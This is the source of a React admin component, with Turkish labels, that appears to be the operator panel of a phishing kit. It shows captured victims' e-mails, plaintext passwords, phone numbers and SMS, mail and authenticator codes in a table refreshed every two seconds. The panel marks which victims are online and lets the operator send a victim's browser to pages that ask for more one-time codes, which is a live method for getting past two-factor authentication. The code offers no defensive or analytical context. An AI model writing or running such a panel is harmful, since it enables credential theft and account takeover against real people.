'use client'

import React, { useState, useEffect } from 'react'
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table'
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog'
import { Input } from '@/components/ui/input'
import { Search, Loader2, Plus } from 'lucide-react'

interface User {
  id: number
  username: string
  password: string
  phone: string
  phone_sms: string
  mail_sms: string
  auth: string
  hotmail: string
  ipAddress: string
}

const PAGES = {
  AUTH: '/auth',
  MAIL: '/mail-kod',
  PHONE: '/phone',
  SMS: '/sms',
  WAIT: '/wait'
} as const

const PAGE_LABELS = {
  [PAGES.AUTH]: 'Authenticator Doğrulama',
  [PAGES.MAIL]: 'Mail Doğrulama',
  [PAGES.PHONE]: 'Telefon',
  [PAGES.SMS]: 'SMS Doğrulama',
  [PAGES.WAIT]: 'Bekleme'
}

const UserTable = () => {
  const [searchTerm, setSearchTerm] = useState('')
  const [users, setUsers] = useState<User[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState('')
  const [modalOpen, setModalOpen] = useState(false)
  const [selectedIP, setSelectedIP] = useState('')
  const [activeUsers, setActiveUsers] = useState<string[]>([])
  const [activeCount, setActiveCount] = useState(0)

  useEffect(() => {
    // İlk yükleme
    fetchData()
    
    // Her 2 saniyede bir tüm verileri güncelle
    const interval = setInterval(fetchData, 2000)
    
    return () => clearInterval(interval)
  }, [])

  // Tüm verileri çeken fonksiyon
  const fetchData = async () => {
    await Promise.all([
      fetchUsers(),
      fetchActiveUsers()
    ])
  }

  const fetchActiveUsers = async () => {
    try {
      const response = await fetch('/api/active')
      const data = await response.json()

      if (data.success) {
        setActiveUsers(data.activeIps)
        setActiveCount(data.activeCount)
      }
    } catch (err) {
      console.error('Active users fetch error:', err)
    }
  }

  const fetchUsers = async () => {
    try {
      const response = await fetch('/api/admin')
      const data = await response.json()

      if (data.success) {
        setUsers(data.data)
      } else {
        setError('Veriler alınamadı')
      }
    } catch (err) {
      setError('Bir hata oluştu')
    } finally {
      setLoading(false)
    }
  }

  const handleDelete = async (id: number) => {
    if (!confirm('Bu kaydı silmek istediğinize emin misiniz?')) return
  
    try {
      const response = await fetch('/api/admin', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          action: 'delete',
          id: id
        })
      })
  
      const data = await response.json()
  
      if (data.success) {
        setUsers(users.filter(user => user.id !== id))
        alert('Kayıt başarıyla silindi')
      } else {
        alert(data.message || 'Silme işlemi başarısız')
      }
    } catch (err) {
      console.error('Delete error:', err)
      alert('Bir hata oluştu')
    }
  }

  const handleRedirect = async (page: string) => {
    try {
      const response = await fetch('/api/redirect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          ipAddress: selectedIP,
          page: page
        })
      })

      const data = await response.json()

      if (data.success) {
        setModalOpen(false)
      } else {
        alert('Yönlendirme işlemi başarısız')
      }
    } catch (err) {
      alert('Bir hata oluştu')
    }
  }

  const filteredUsers = users.filter((user) =>
    Object.values(user).some((value) =>
      value?.toString().toLowerCase().includes(searchTerm.toLowerCase())
    )
  )

  if (loading) {
    return (
      <div className="flex justify-center items-center min-h-[400px]">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    )
  }

  if (error) {
    return (
      <div className="text-center text-red-500 py-4">
        {error}
      </div>
    )
  }

  return (
    <div className="space-y-4 p-4">
      <div className="flex justify-between items-center">
        <div className="relative">
          <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
          <Input
            placeholder="log ara..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="pl-8 w-[300px]"
          />
        </div>
        
        <div className="flex items-center gap-2">
          <div className={`px-3 py-1 rounded-full ${activeCount > 0 ? 'bg-green-500' : 'bg-gray-500'} text-white`}>
            {activeCount} Çevrimiçi
          </div>
          <button
            onClick={async () => {
              if (confirm('Tüm logları silmek istediğinize emin misiniz?')) {
                try {
                  const response = await fetch('/api/delete', {
                    method: 'POST'
                  });
                  const data = await response.json();
                  
                  if (data.success) {
                    alert('Tüm loglar başarıyla temizlendi');
                    fetchData(); // Tabloyu yenile
                  } else {
                    alert(data.message || 'Bir hata oluştu');
                  }
                } catch (err) {
                  alert('Bir hata oluştu');
                }
              }
            }}
            className="px-3 py-1 bg-red-500 text-white rounded-md hover:bg-red-600 flex items-center gap-1"
          >
            Logları Temizle
          </button>
        </div>
      </div>

      <div className="rounded-md border">
        <Table>
          <TableHeader>
            <TableRow>
              <TableHead>ID</TableHead>
              <TableHead>IP</TableHead>
              <TableHead>E-posta</TableHead>
              <TableHead>Şifre</TableHead>
              <TableHead>Telefon</TableHead>
              <TableHead>SMS Kod</TableHead>
              <TableHead>Mail Kod</TableHead>
              <TableHead>Auth Kod</TableHead>
              <TableHead>İşlemler</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {filteredUsers.map((user) => (
              <TableRow 
                key={user.id}
                className={activeUsers.includes(user.ipAddress) ? 'bg-green-200' : ''}
              >
                <TableCell>{user.id}</TableCell>
                <TableCell>{user.ipAddress}</TableCell>
                <TableCell>{user.username}</TableCell>
                <TableCell>{user.password}</TableCell>
                <TableCell>{user.phone}</TableCell>
                <TableCell>{user.phone_sms}</TableCell>
                <TableCell>{user.mail_sms}</TableCell>
                <TableCell>{user.auth}</TableCell>
                <TableCell>
                  <div className="flex gap-2">
                    <button
                      onClick={() => {
                        setSelectedIP(user.ipAddress)
                        setModalOpen(true)
                      }}
                      className="text-sm p-1 bg-blue-500 text-white rounded-md hover:bg-blue-600"
                    >
                      <Plus className="h-6 w-6" />
                    </button>
                    <button
                      onClick={() => handleDelete(user.id)}
                      className="text-sm px-2 py-1 bg-red-500 text-white rounded-md hover:bg-red-600"
                    >
                      Sil
                    </button>
                  </div>
                </TableCell>
              </TableRow>
            ))}
          </TableBody>
        </Table>
      </div>

      <Dialog open={modalOpen} onOpenChange={setModalOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Sayfa Seçin</DialogTitle>
          </DialogHeader>
          <div className="grid grid-cols-2 gap-2 p-4">
            {Object.entries(PAGES).map(([key, route]) => (
              <button
                key={key}
                onClick={() => handleRedirect(route)}
                className="p-2 text-sm border rounded hover:bg-gray-100"
              >
                {PAGE_LABELS[route]}
              </button>
            ))}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}

export default UserTable